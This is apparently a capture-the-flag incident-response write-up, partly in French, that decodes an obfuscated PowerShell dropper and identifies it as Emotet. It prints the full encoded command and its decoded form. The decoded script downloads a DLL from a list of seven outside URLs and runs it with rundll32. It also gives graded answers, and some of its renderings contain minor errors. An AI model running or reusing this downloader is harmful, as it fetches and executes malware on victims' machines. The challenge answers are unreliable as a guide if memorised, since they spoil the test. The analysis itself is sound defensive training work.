
## Scenario

```
Recently the networks of a large company named GothamLegend were compromised after an employee opened a phishing email containing malware. The damage caused was critical and resulted in business-wide disruption. GothamLegend had to reach out to a third-party incident response team to assist with the investigation. You are a member of the IR team - all you have is an encoded Powershell script. Can you decode it and identify what malware is responsible for this attack?  
  
Reading Material:
[link 1 ](https://malware.news/t/deobfuscating-powershell-putting-the-toothpaste-back-in-the-tube/23509)
```


```powershell
# the file contains : 

POwersheLL  -w hidden -ENCOD                 IABzAEUAdAAgAE0ASwB1ACAAKAAgAFsAVABZAFAAZQBdACgAIgB7ADAAfQB7ADEAfQB7ADIAfQB7ADQAfQB7ADMAfQAiACAALQBGACAAJwBTAFkAcwBUACcALAAnAGUATQAuACcALAAnAGkAbwAuAEQASQAnACwAJwBPAFIAWQAnACwAJwByAEUAQwB0ACcAKQAgACkAOwAgACAAIAAgAFMAZQBUAC0AaQBUAEUATQAgACAAKAAnAHYAYQBSACcAKwAnAEkAYQBiAEwARQAnACsAJwA6AG0AQgB1ACcAKQAgACgAIAAgAFsAVABZAFAAZQBdACgAIgB7ADYAfQB7ADgAfQB7ADAAfQB7ADMAfQB7ADQAfQB7ADUAfQB7ADIAfQB7ADcAfQB7ADEAfQAiACAALQBmACcAUwB0AGUATQAnACwAJwBHAGUAcgAnACwAJwBNAGEAJwAsACcALgBuACcALAAnAGUAdAAuAHMAZQBSAFYASQBjAGUAcABPAGkAJwAsACcAbgB0ACcALAAnAHMAJwAsACcATgBBACcALAAnAFkAJwApACkAOwAgACQARQByAHIAbwByAEEAYwB0AGkAbwBuAFAAcgBlAGYAZQByAGUAbgBjAGUAIAA9ACAAKAAoACcAUwAnACsAJwBpAGwAJwApACsAKAAnAGUAbgAnACsAJwB0ACcAKQArACcAbAB5ACcAKwAoACcAQwBvAG4AdAAnACsAJwBpACcAKwAnAG4AdQBlACcAKQApADsAJABDAHYAbQBtAHEANABvAD0AJABRADIANgBMACAAKwAgAFsAYwBoAGEAcgBdACgANgA0ACkAIAArACAAJABFADEANgBIADsAJABKADEANgBKAD0AKAAnAE4AJwArACgAJwBfADAAJwArACcAUAAnACkAKQA7ACAAKABEAEkAcgAgAFYAYQByAGkAYQBiAEwARQA6AE0AawB1ACAAIAApAC4AVgBhAEwAVQBlADoAOgAiAGMAYABSAEUAQQB0AGAAZQBkAEkAYABSAEUAQwBgAFQATwBSAHkAIgAoACQASABPAE0ARQAgACsAIAAoACgAJwB7ACcAKwAnADAAfQBEAGIAXwBiAGgAJwArACcAMwAwACcAKwAnAHsAMAB9ACcAKwAnAFkAZgAnACsAJwA1AGIAZQA1AGcAewAwAH0AJwApACAALQBGACAAWwBjAGgAQQBSAF0AOQAyACkAKQA7ACQAQwAzADkAWQA9ACgAKAAnAFUANgAnACsAJwA4ACcAKQArACcAUwAnACkAOwAgACAAKAAgAHYAQQBSAGkAYQBCAEwAZQAgACAAKAAiAG0AIgArACIAYgB1ACIAKQAgACAALQBWAEEAbAB1AGUAbwBOACAAIAApADoAOgAiAHMARQBjAHUAUgBJAFQAWQBwAHIAbwBUAGAAbwBgAGMAYABvAGwAIgAgAD0AIAAoACcAVAAnACsAKAAnAGwAcwAnACsAJwAxADIAJwApACkAOwAkAEYAMwA1AEkAPQAoACcASQAnACsAKAAnADQAJwArACcAXwBCACcAKQApADsAJABTAHcAcgBwADYAdABjACAAPQAgACgAKAAnAEEANgAnACsAJwA5ACcAKQArACcAUwAnACkAOwAkAFgAMgA3AEgAPQAoACcAQwAzACcAKwAnADMATwAnACkAOwAkAEkAbQBkADEAeQBjAGsAPQAkAEgATwBNAEUAKwAoACgAKAAnAFUATwAnACsAJwBIACcAKwAnAEQAYgBfACcAKQArACcAYgAnACsAKAAnAGgAMwAnACsAJwAwAFUATwAnACkAKwAoACcASABZACcAKwAnAGYAJwApACsAKAAnADUAYgBlADUAJwArACcAZwAnACsAJwBVAE8ASAAnACkAKQAuACIAUgBlAFAAYABsAEEAQwBlACIAKAAoACcAVQAnACsAJwBPAEgAJwApACwAWwBTAHQAcgBJAG4ARwBdAFsAYwBoAEEAcgBdADkAMgApACkAKwAkAFMAdwByAHAANgB0AGMAKwAoACgAJwAuACcAKwAnAGQAbAAnACkAKwAnAGwAJwApADsAJABLADQANwBWAD0AKAAnAFIAJwArACgAJwA0ACcAKwAnADkARwAnACkAKQA7ACQAQgA5AGYAaABiAHkAdgA9ACgAJwBdACcAKwAoACcAYQAnACsAJwBuAHcAWwAzAHMAOgAvAC8AYQBkAG0AJwArACcAaQBuAHQAJwArACcAawAuAGMAJwArACcAbwAnACsAJwBtAC8AJwArACcAdwAnACkAKwAoACcAcAAtAGEAZABtACcAKwAnAGkAbgAvACcAKwAnAEwALwAnACkAKwAnAEAAJwArACgAJwBdAGEAJwArACcAbgAnACsAJwB3AFsAMwBzACcAKQArACcAOgAnACsAJwAvACcAKwAnAC8AbQAnACsAKAAnAGkAawBlACcAKwAnAGcAZQAnACkAKwAoACcAZQAnACsAJwByACcAKwAnAGkAbgBjAGsALgAnACkAKwAoACcAYwAnACsAJwBvAG0AJwApACsAKAAnAC8AYwAvACcAKwAnAFkAJwArACcAWQBzACcAKQArACcAYQAnACsAKAAnAC8AQABdACcAKwAnAGEAbgB3ACcAKwAnAFsAJwArACcAMwA6AC8ALwBmAHIAZQBlACcAKwAnAGwAYQBuAGMAJwArACcAZQAnACsAJwByAHcAJwApACsAKAAnAGUAYgBkAGUAcwBpACcAKwAnAGcAbgBlAHIAaAAnACsAJwB5AGQAJwApACsAKAAnAGUAcgAnACsAJwBhAGIAYQAnACkAKwAoACcAZAAuACcAKwAnAGMAbwBtAC8AJwApACsAKAAnAGMAZwBpACcAKwAnAC0AYgBpAG4AJwArACcALwBTACcAKQArACgAJwAvACcAKwAnAEAAJwArACcAXQBhAG4AdwAnACkAKwAoACcAWwAzACcAKwAnADoALwAvACcAKwAnAGUAdABkAG8AZwAuAGMAbwAnACsAJwBtACcAKwAnAC8AdwAnACkAKwAoACcAcAAtACcAKwAnAGMAbwAnACkAKwAnAG4AdAAnACsAKAAnAGUAJwArACcAbgB0ACcAKQArACgAJwAvAG4AJwArACcAdQAvAEAAJwApACsAKAAnAF0AYQAnACsAJwBuAHcAWwAzACcAKQArACcAcwAnACsAKAAnADoALwAvACcAKwAnAHcAdwB3ACcAKwAnAC4AaABpAG4AdAB1ACcAKwAnAHAALgBjACcAKQArACgAJwBvACcAKwAnAG0ALgAnACkAKwAoACcAYgAnACsAJwByAC8AJwApACsAJwB3ACcAKwAoACcAcAAnACsAJwAtAGMAbwAnACkAKwAoACcAbgAnACsAJwB0AGUAbgAnACkAKwAoACcAdAAnACsAJwAvAGQARQAvACcAKwAnAEAAXQBhACcAKwAnAG4AdwBbADMAOgAvAC8AJwArACcAdwB3AHcALgAnACkAKwAnAHMAJwArACgAJwB0AG0AJwArACcAYQByAG8AdQBuAHMAJwArACcALgAnACkAKwAoACcAbgBzACcAKwAnAHcAJwApACsAKAAnAC4AJwArACcAZQBkAHUALgBhAHUALwBwACcAKwAnAGEAJwArACcAeQAnACsAJwBwAGEAbAAvAGIAOAAnACkAKwAoACcARwAnACsAJwAvAEAAXQAnACkAKwAoACcAYQAnACsAJwBuAHcAWwAnACkAKwAoACcAMwA6ACcAKwAnAC8AJwApACsAKAAnAC8AJwArACcAdwBtAC4AbQBjAGQAZQB2AGUAJwArACcAbABvAHAALgBuAGUAdAAnACsAJwAvACcAKwAnAGMAJwArACcAbwBuACcAKwAnAHQAJwArACcAZQAnACkAKwAoACcAbgB0ACcAKwAnAC8AJwApACsAJwA2ACcAKwAoACcARgAyACcAKwAnAGcAZAAvACcAKQApAC4AIgBSAEUAYABwAGAAbABBAEMAZQAiACgAKAAoACcAXQBhACcAKwAnAG4AJwApACsAKAAnAHcAJwArACcAWwAzACcAKQApACwAKABbAGEAcgByAGEAeQBdACgAJwBzAGQAJwAsACcAcwB3ACcAKQAsACgAKAAnAGgAJwArACcAdAB0ACcAKQArACcAcAAnACkALAAnADMAZAAnACkAWwAxAF0AKQAuACIAcwBgAFAATABJAFQAIgAoACQAQwA4ADMAUgAgACsAIAAkAEMAdgBtAG0AcQA0AG8AIAArACAAJABGADEAMABRACkAOwAkAFEANQAyAE0APQAoACcAUAAnACsAKAAnADAAJwArACcANQBLACcAKQApADsAZgBvAHIAZQBhAGMAaAAgACgAJABCAG0ANQBwAHcANgB6ACAAaQBuACAAJABCADkAZgBoAGIAeQB2ACkAewB0AHIAeQB7ACgAJgAoACcATgBlAHcAJwArACcALQBPAGIAagBlAGMAJwArACcAdAAnACkAIABTAHkAcwBUAGUAbQAuAG4ARQB0AC4AVwBFAEIAYwBMAEkAZQBOAFQAKQAuACIAZABvAGAAVwBOAGwAYABPAGEARABgAEYASQBsAEUAIgAoACQAQgBtADUAcAB3ADYAegAsACAAJABJAG0AZAAxAHkAYwBrACkAOwAkAFoAMQAwAEwAPQAoACcAQQA5ACcAKwAnADIAUQAnACkAOwBJAGYAIAAoACgAJgAoACcARwBlACcAKwAnAHQALQBJAHQAJwArACcAZQBtACcAKQAgACQASQBtAGQAMQB5AGMAawApAC4AIgBsAGUAbgBgAEcAYABUAEgAIgAgAC0AZwBlACAAMwA1ADYAOQA4ACkAIAB7ACYAKAAnAHIAJwArACcAdQBuAGQAbAAnACsAJwBsADMAMgAnACkAIAAkAEkAbQBkADEAeQBjAGsALAAoACgAJwBDAG8AJwArACcAbgB0ACcAKQArACcAcgAnACsAKAAnAG8AbAAnACsAJwBfAFIAdQBuAEQAJwArACcATAAnACkAKwAnAEwAJwApAC4AIgBUAGAATwBTAHQAYABSAGkATgBHACIAKAApADsAJABSADYANQBJAD0AKAAnAFoAJwArACgAJwAwADkAJwArACcAQgAnACkAKQA7AGIAcgBlAGEAawA7ACQASwA3AF8ASAA9ACgAJwBGADEAJwArACcAMgBVACcAKQB9AH0AYwBhAHQAYwBoAHsAfQB9ACQAVwA1ADQASQA9ACgAKAAnAFYAOQAnACsAJwA1ACcAKQArACcATwAnACkA
```



## Désobfuscation

- [article 1 ](https://securityliterate.com/malware-analysis-in-5-minutes-deobfuscating-powershell-scripts/)
- [article 2](https://mahim-firoj.medium.com/how-to-analyze-powershell-obfuscated-code-6aff086a8055)
- [article 2 (suite)](https://mahim-firoj.medium.com/how-to-analyze-powershell-obfuscated-code-part-2-b9f5204818f0)
- [article 2 (suite 2 )](https://mahim-firoj.medium.com/how-to-analyze-powershell-obfuscated-code-part-3-6e7d07610c31)
- [article 3](https://community.sophos.com/sophos-labs/b/blog/posts/decoding-malicious-powershell)


##### LAYER 1 désobfuscation


- Utiliser Cyberchef 
	- FROM base64 + Decode text ( UTF-16LE (1200) )
- utiliser un cmd linux
	- ```base64 -d <fileName> ```
	
```powershell
 sEt MKu ( [TYPe]("{0}{1}{2}{4}{3}" -F 'SYsT','eM.','io.DI','ORY','rECt') );    SeT-iTEM  ('vaR'+'IabLE'+':mBu') (  [TYPe]("{6}{8}{0}{3}{4}{5}{2}{7}{1}" -f'SteM','Ger','Ma','.n','et.seRVIcepOi','nt','s','NA','Y')); $ErrorActionPreference = (('S'+'il')+('en'+'t')+'ly'+('Cont'+'i'+'nue'));$Cvmmq4o=$Q26L + [char](64) + $E16H;$J16J=('N'+('_0'+'P')); (DIr VariabLE:Mku  ).VaLUe::"c`REAt`edI`REC`TORy"($HOME + (('{'+'0}Db_bh'+'30'+'{0}'+'Yf'+'5be5g{0}') -F [chAR]92));$C39Y=(('U6'+'8')+'S');  ( vARiaBLe  ("m"+"bu")  -VAlueoN  )::"sEcuRITYproT`o`c`ol" = ('T'+('ls'+'12'));$F35I=('I'+('4'+'_B'));$Swrp6tc = (('A6'+'9')+'S');$X27H=('C3'+'3O');$Imd1yck=$HOME+((('UO'+'H'+'Db_')+'b'+('h3'+'0UO')+('HY'+'f')+('5be5'+'g'+'UOH'))."ReP`lACe"(('U'+'OH'),[StrInG][chAr]92))+$Swrp6tc+(('.'+'dl')+'l');$K47V=('R'+('4'+'9G'));$B9fhbyv=(']'+('a'+'nw[3s://adm'+'int'+'k.c'+'o'+'m/'+'w')+('p-adm'+'in/'+'L/')+'@'+(']a'+'n'+'w[3s')+':'+'/'+'/m'+('ike'+'ge')+('e'+'r'+'inck.')+('c'+'om')+('/c/'+'Y'+'Ys')+'a'+('/@]'+'anw'+'['+'3://free'+'lanc'+'e'+'rw')+('ebdesi'+'gnerh'+'yd')+('er'+'aba')+('d.'+'com/')+('cgi'+'-bin'+'/S')+('/'+'@'+']anw')+('[3'+'://'+'etdog.co'+'m'+'/w')+('p-'+'co')+'nt'+('e'+'nt')+('/n'+'u/@')+(']a'+'nw[3')+'s'+('://'+'www'+'.hintu'+'p.c')+('o'+'m.')+('b'+'r/')+'w'+('p'+'-co')+('n'+'ten')+('t'+'/dE/'+'@]a'+'nw[3://'+'www.')+'s'+('tm'+'arouns'+'.')+('ns'+'w')+('.'+'edu.au/p'+'a'+'y'+'pal/b8')+('G'+'/@]')+('a'+'nw[')+('3:'+'/')+('/'+'wm.mcdeve'+'lop.net'+'/'+'c'+'on'+'t'+'e')+('nt'+'/')+'6'+('F2'+'gd/'))."RE`p`lACe"(((']a'+'n')+('w'+'[3')),([array]('sd','sw'),(('h'+'tt')+'p'),'3d')[1])."s`PLIT"($C83R + $Cvmmq4o + $F10Q);$Q52M=('P'+('0'+'5K'));foreach ($Bm5pw6z in $B9fhbyv){try{(&('New'+'-Objec'+'t') SysTem.nEt.WEBcLIeNT)."do`WNl`OaD`FIlE"($Bm5pw6z, $Imd1yck);$Z10L=('A9'+'2Q');If ((&('Ge'+'t-It'+'em') $Imd1yck)."len`G`TH" -ge 35698) {&('r'+'undl'+'l32') $Imd1yck,(('Co'+'nt')+'r'+('ol'+'_RunD'+'L')+'L')."T`OSt`RiNG"();$R65I=('Z'+('09'+'B'));break;$K7_H=('F1'+'2U')}}catch{}}$W54I=(('V9'+'5')+'O')
```

#### Layer 2 - desobfuscation

```powershell

Set MKu ([Type]("System.IO.Directory"));
Set-Item ('variable:mBu') ([Type]("System.Management.ServiceProcess"));

# $mbu =>  System.Net.ServicePointManager

$ErrorActionPreference = 'SilentlyContinue';
$Cvmmq4o = $Q26L + [char](64) + $E16H; 
$J16J = 'N' + ('_0' + 'P');
(Dir Variable:Mku).Value::"CreateDirectory"($HOME + '\Db_bh30\Yf5be5g');
$C39Y = 'U68S';
(Variable("mbu") -Valueon)::"SecurityProtocol" = 'Tls12';
$F35I = 'I4_B';
$Swrp6tc = 'A69S';
$X27H = 'C33O';
$Imd1yck = $HOME + (('UOHDb_bh30UOHYf5be5gUOH').Replace('UOH', [String][char]92)) + $Swrp6tc + ('.dll')

# $Imd1yck => $HOME +  '\Db_bh30\Yf5be5g\A69S.dll';

$K47V = 'R49G'
$B9fhbyv = ']anw[3s://admintk.com/wp-admin/L/@]anw[3://mikegeerinck.com/c/YYsa/@]anw[3://freelancerwebdesignerhyderabad.com/cgi-bin/S/@]anw[3://etdog.com/wp-content/nu/@]anw[3://www.hintup.com.br/wp-content/dE/@]anw[3://www.stmarouns.nsw.edu.au/paypal/b8G/@]anw[3://wm.mcdevelop.net/content/6F2gd/').Replace((']anw[3'), [array]('sd', 'sw', 'http', '3d')[1]).Split($C83R + $Cvmmq4o + $F10Q);

# B9fhbyv => `https://admintk.com/wp-admin/L/ https://mikegeerinck.com/c/YYsa/ http://freelancerwebdesignerhyderabad.com/cgi-bin/S/ http://etdog.com/wp-content/nu/ https://www.hintup.com.br/wp-content/dE/ http://www.stmarouns.nsw.edu.au/paypal/b8G/ http://wm.mcdevelop.net/content/6F2gd/`

$Q52M = 'P05K';

foreach ($Bm5pw6z in $B9fhbyv) {
    try {
        (&('New'+'-Object') System.Net.WebClient)."DownloadFile"($Bm5pw6z, $Imd1yck)
        $Z10L = 'A92Q'
        if ((&('Get-Item') $Imd1yck)."length" -ge 35698) {
            &('rundl32') $Imd1yck, (('Control_RunDLL') + 'L').ToString()
            $R65I = 'Z09B'
            break
        }
        $K7_H = 'F12U'
    } catch {
    }
}
$W54I = 'V95O';

```

## Solution

### What security protocol is being used for the communication with a malicious domain? _(3 points)_

```
# (Variable("mbu") -Valueon)::"SecurityProtocol" = 'Tls12'; 

TLS 12 
```

### What directory does the obfuscated PowerShell create? (Starting from \HOME\) _(4 points)_

```
# (Dir Variable:Mku).Value::"CreateDirectory"($HOME + '\Db_bh30\Yf5be5g');

\HOME\Db_bh30\Yf5be5g\
```

### What file is being downloaded (full name)? _(4 points)_

```
# $Swrp6tc = 'A69S';
# $X27H = 'C33O';
# $Imd1yck = $HOME + (('UOHDb_bh30UOHYf5be5gUOH').Replace('UOH', [String][char]92)) + $Swrp6tc + ('.dll')

# $Imd1yck => $HOME +  '\Db_bh30\Yf5be5g\A69S.dll';

A69S.dll

```

### What is used to execute the downloaded file? _(3 points)_

```
# &('rundl32') $Imd1yck, (('Control_RunDLL') + 'L').ToString()

rundl32
```

### What is the domain name of the URI ending in ‘/6F2gd/’ _(3 points)_

```
# $B9fhbyv = ']anw[3s://admintk.com/wp-admin/L/@]anw[3://mikegeerinck.com/c/YYsa/@]anw[3://freelancerwebdesignerhyderabad.com/cgi-bin/S/@]anw[3://etdog.com/wp-content/nu/@]anw[3://www.hintup.com.br/wp-content/dE/@]anw[3://www.stmarouns.nsw.edu.au/paypal/b8G/@]anw[3://wm.mcdevelop.net/content/6F2gd/').Replace((']anw[3'), [array]('sd', 'sw', 'http', '3d')[1]).Split($C83R + $Cvmmq4o + $F10Q);

# B9fhbyv => `https://admintk.com/wp-admin/L/ https://mikegeerinck.com/c/YYsa/ http://freelancerwebdesignerhyderabad.com/cgi-bin/S/ http://etdog.com/wp-content/nu/ https://www.hintup.com.br/wp-content/dE/ http://www.stmarouns.nsw.edu.au/paypal/b8G/ http://wm.mcdevelop.net/content/6F2gd/`

# http://wm.mcdevelop.net/content/6F2gd/

wm.mcdevelop.net

```

### Based on the analysis of the obfuscated code, what is the name of the malware? _(3 points)_

```
# chercher sur internet : db_bh30/Yf5be5g
# 
emotet
```